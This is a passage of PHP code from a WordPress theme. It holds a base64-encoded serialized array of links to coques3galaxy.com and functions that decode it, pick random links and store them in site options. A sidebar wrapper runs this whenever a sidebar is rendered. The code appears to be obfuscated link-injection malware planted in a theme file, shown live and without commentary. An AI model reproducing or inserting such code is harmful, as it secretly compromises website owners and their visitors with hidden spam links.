3dy5jb3F1ZXMzZ2FsYXh5LmNvbSI7czoyODoiaHR0cDovL3d3dy5jb3F1ZXMzZ2FsYXh5LmNvbSI7czoyODoiaHR0cDovL3d3dy5jb3F1ZXMzZ2FsYXh5LmNvbSI7czoxNzoiY29xdWVzM2dhbGF4eS5jb20iO3M6Mjg6Imh0dHA6Ly93d3cuY29xdWVzM2dhbGF4eS5jb20iO319"; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>